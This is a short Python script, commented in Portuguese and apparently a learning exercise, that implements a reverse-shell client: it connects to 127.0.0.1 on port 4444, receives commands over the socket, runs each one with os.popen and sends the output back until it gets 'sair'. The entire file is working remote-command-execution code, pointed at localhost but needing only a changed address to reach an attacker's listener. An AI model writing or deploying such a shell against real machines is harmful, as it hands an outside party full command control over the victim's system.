''' Criando um cliente '''
import socket
import os

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(('127.0.0.1', 4444))  # Conectando no próprio servidor local

while True:
    comando = cliente.recv(1024).decode()

    if comando.lower() == 'sair':
        break

    resultado = os.popen(comando).read()
    if resultado == '':
        resultado = '[sem saída]'

    cliente.send(resultado.encode())

cliente.close()